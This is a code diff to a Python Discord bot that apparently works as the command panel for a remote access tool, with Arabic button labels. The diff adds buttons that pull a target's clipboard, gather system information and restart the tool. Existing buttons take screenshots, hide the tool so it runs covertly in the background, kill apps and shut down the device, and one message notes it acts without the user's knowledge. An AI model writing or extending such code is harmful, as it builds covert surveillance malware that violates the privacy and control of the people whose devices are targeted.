@@ -376,7 +376,36 @@ class DeviceActionsView(discord.ui.View):
             db.setdefault("remote_screenshots", {})[self.code] = {"id": str(int(time.time()))}
             if save_db(db, sha, url, headers, f"SS {self.code}"): await interaction.followup.send("📸 تم طلب لقطة الشاشة!", ephemeral=True)
 
-    @discord.ui.button(label="🛡️ تفعيل الثبات الإلزامي (إخفاء بالخفاء)", style=discord.ButtonStyle.success, custom_id="dev_act_lock_app", row=2)
+    # --- الأوامر الثلاثة الجديدة باللون البنفسجي (Secondary) ---
+    @discord.ui.button(label="📋 جلب الحافظة", style=discord.ButtonStyle.secondary, custom_id="dev_act_clipboard", row=2)
+    async def clipboard_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
+        db, sha, url, headers = fetch_db()
+        if db:
+            db.setdefault("remote_clipboards", {})[self.code] = {"id": str(int(time.time()))}
+            if save_db(db, sha, url, headers, f"Clipboard {self.code}"): 
+                await interaction.followup.send("📋 تم إرسال أمر سحب الحافظة للعميل!", ephemeral=True)
+
+    @discord.ui.button(label="📊 مواصفات النظام", style=discord.ButtonStyle.secondary, custom_id="dev_act_sysinfo", row=2)
+    async def sysinfo_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
+        db, sha, url, headers = fetch_db()
+        if db:
+            db.setdefault("remote_sysinfo", {})[self.code] = {"id": str(int(time.time()))}
+            if save_db(db, sha, url, headers, f"Sysinfo {self.code}"): 
+                await interaction.followup.send("📊 تم إرسال طلب جلب مواصفات النظام للعميل!", ephemeral=True)
+
+    @discord.ui.button(label="🔄 إعادة تشغيل الأداة", style=discord.ButtonStyle.secondary, custom_id="dev_act_restart_app", row=2)
+    async def restartapp_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
+        db, sha, url, headers = fetch_db()
+        if db:
+            db.setdefault("remote_restarts", {})[self.code] = {"id": str(int(time.time()))}
+            if save_db(db, sha, url, headers, f"Restart App {self.code}"): 
+                await interaction.followup.send("🔄 تم إرسال أمر إعادة تشغيل الأداة للعميل!", ephemeral=True)
+    # ----------------------------------------------------
+
+    @discord.ui.button(label="🛡️ تفعيل الثبات الإلزامي (إخفاء بالخفاء)", style=discord.ButtonStyle.success, custom_id="dev_act_lock_app", row=3)
     async def lock_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
@@ -384,7 +413,7 @@ class DeviceActionsView(discord.ui.View):
             db.setdefault("remote_lock_states", {})[self.code] = {"locked": True, "id": str(int(time.time()))}
             if save_db(db, sha, url, headers, f"Lock {self.code}"): await interaction.followup.send("🛡️ تم إخفاء الأداة من شاشة العميل وجعلها تعمل في الخلفية بثبات تام!", ephemeral=True)
 
-    @discord.ui.button(label="🔓 إلغاء الثبات (إظهار النافذة)", style=discord.ButtonStyle.secondary, custom_id="dev_act_unlock_app", row=2)
+    @discord.ui.button(label="🔓 إلغاء الثبات (إظهار النافذة)", style=discord.ButtonStyle.secondary, custom_id="dev_act_unlock_app", row=3)
     async def unlock_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
@@ -393,7 +422,7 @@ class DeviceActionsView(discord.ui.View):
                 del db["remote_lock_states"][self.code]
             if save_db(db, sha, url, headers, f"Unlock {self.code}"): await interaction.followup.send("🔓 تم إلغاء الثبات وإعادة إظهار نافذة العميل بنجاح!", ephemeral=True)
 
-    @discord.ui.button(label="🛑 إطفاء الأداة (خروج كامل)", style=discord.ButtonStyle.danger, custom_id="dev_act_kill_persistent", row=3)
+    @discord.ui.button(label="🛑 إطفاء الأداة (خروج كامل)", style=discord.ButtonStyle.danger, custom_id="dev_act_kill_persistent", row=4)
     async def kill_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
@@ -403,7 +432,7 @@ class DeviceActionsView(discord.ui.View):
                 del db["remote_lock_states"][self.code]
             if save_db(db, sha, url, headers, f"Close {self.code}"): await interaction.followup.send("🛑 تم إرسال أمر إطفاء الأداة وإغلاقها نهائياً للعميل دون علمه!", ephemeral=True)
 
-    @discord.ui.button(label="إغلاق البرامج في الخلفية", style=discord.ButtonStyle.danger, custom_id="dev_act_kill_all_apps", row=3)
+    @discord.ui.button(label="إغلاق البرامج في الخلفية", style=discord.ButtonStyle.danger, custom_id="dev_act_kill_all_apps", row=4)
     async def kill_all_apps_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
@@ -412,7 +441,7 @@ class DeviceActionsView(discord.ui.View):
             if save_db(db, sha, url, headers, f"Kill all background apps for {self.code}"): 
                 await interaction.followup.send("🛑 تم إرسال أمر إغلاق البرامج في الخلفية بناءً على طلبك!", ephemeral=True)
 
-    @discord.ui.button(label="⚡ إيقاف تشغيل جهاز العميل", style=discord.ButtonStyle.danger, custom_id="dev_act_shutdown", row=4)
+    @discord.ui.button(label="⚡ إيقاف تشغيل جهاز العميل", style=discord.ButtonStyle.danger, custom_id="dev_act_shutdown", row=5)
     async def shut_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
